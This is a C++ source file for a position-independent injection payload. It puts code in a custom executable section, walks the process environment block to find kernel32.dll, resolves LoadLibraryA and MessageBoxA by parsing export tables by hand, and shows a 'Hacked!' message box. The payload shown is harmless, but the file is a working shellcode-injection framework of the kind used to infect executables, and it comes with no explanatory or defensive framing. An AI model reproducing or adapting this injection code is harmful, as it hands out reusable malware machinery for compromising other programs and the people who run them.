#include <windows.h>
#include <array>
#include <winternl.h>

#pragma section("inject" , read, execute)

extern "C"
__declspec(allocate("inject"))
struct ressource_t
{
    std::array<wchar_t, 50> kernel32;
    std::array<char, 50> loadlib;
    std::array<char, 50> user32;
    std::array<char, 50> msgbox;
    std::array<char, 50> msg_title;
    std::array<char, 50> msg_caption;
}
__ressource = {
    {L"kernel32.dll"},
    {"LoadLibraryA"},
    {"user32.dll"},
    {"MessageBoxA"},
    {"Hacked!"},
    {"Hello"},
};

static inline int wlen(const wchar_t* s)
{
    int i = 0;
    while (s[i])
        i += 1;
    return i;
}

static inline wchar_t wlow(const wchar_t c)
{
    if (c >= L'A' && c <= L'Z')
        return c - L'A' + L'a';
    return c;
}

static inline wchar_t endwith(const wchar_t* s1, const wchar_t* s2)
{
    size_t len1 = wlen(s1);
    size_t len2 = wlen(s2);
    int i = len1;
    int j = len2;
    while (i > 0 && j > 0)
    {
        wchar_t c1 = wlow(s1[i]);
        wchar_t c2 = wlow(s2[j]);
        if (c1 != c2)
            return c1;
        i -= 1;
        j -= 1;
    }
    return 0;
}

static inline int my_strcmp(const char* s1, const char* s2)
{
    int i = 0;
    while (s1[i] && s2[i])
    {
        if (s1[i] != s2[i])
            return s1[i] - s2[i];
        i += 1;
    }
    return s1[i] - s2[i];
}

extern "C"
__declspec(code_seg("inject"))
PUCHAR get_dll_inj(const wchar_t* suffix)
{
    PTEB pTeb = NtCurrentTeb();
    PPEB pPeb = pTeb->ProcessEnvironmentBlock;
    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    PLIST_ENTRY pList = &pLdr->InMemoryOrderModuleList;
    for (PLIST_ENTRY pNode = pList->Flink; pNode != pList; pNode = pNode->Flink)
    {
        PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(
            pNode,
            LDR_DATA_TABLE_ENTRY,
            InMemoryOrderLinks
        );
        if (!endwith(pEntry->FullDllName.Buffer, suffix))
            return (PUCHAR)pEntry->DllBase;
    }
    return 0;
}

extern "C"
__declspec(code_seg("inject"))
PVOID get_func_inj(PUCHAR base, const char* func_name)
{
    auto dosHeader = (PIMAGE_DOS_HEADER)base;
    auto pNtHeader = (PIMAGE_NT_HEADERS64)(base + dosHeader->e_lfanew);
    auto pDir = &pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    auto pExport = (PIMAGE_EXPORT_DIRECTORY)(base + pDir->VirtualAddress);
    auto rvaNames = (PDWORD)(base + pExport->AddressOfNames);
    auto rvaPtrs = (PDWORD)(base + pExport->AddressOfFunctions);
    auto rvaOrd = (PWORD)(base + pExport->AddressOfNameOrdinals);
    for (int i = 0; i < pExport->NumberOfNames; i += 1)
    {
        const char* fname = (const char*)(base + rvaNames[i]);
        PUCHAR ptrfunc = (base + rvaPtrs[rvaOrd[i]]);
        if (!my_strcmp(fname, func_name))
            return ptrfunc;
    }
    return nullptr;
}

extern "C" char __begin_of_code;

typedef HMODULE(*LoadLibraryA_t)(LPCSTR lpLibFileName);

typedef int (*MessageBoxA_t)(
    HWND hWnd,
    LPCSTR lpText,
    LPCSTR lpCaption,
    UINT uType
    );

extern "C"
__declspec(code_seg("inject"))
void my_payload(PUCHAR rbp)
{
    LONGLONG delta = (PUCHAR)(&__ressource) - (PUCHAR)&__begin_of_code;
    ressource_t* data = (ressource_t*)(rbp + delta);
    PUCHAR basek32 = get_dll_inj(data->kernel32.data());
    LoadLibraryA_t loadlib = (LoadLibraryA_t)get_func_inj(basek32, data->loadlib.data());
    PUCHAR user32 = (PUCHAR)loadlib(data->user32.data());
    auto msgbox = (MessageBoxA_t)get_func_inj(user32, data->msgbox.data());
    msgbox(NULL, data->msg_title.data(), data->msg_caption.data(), 0);

}

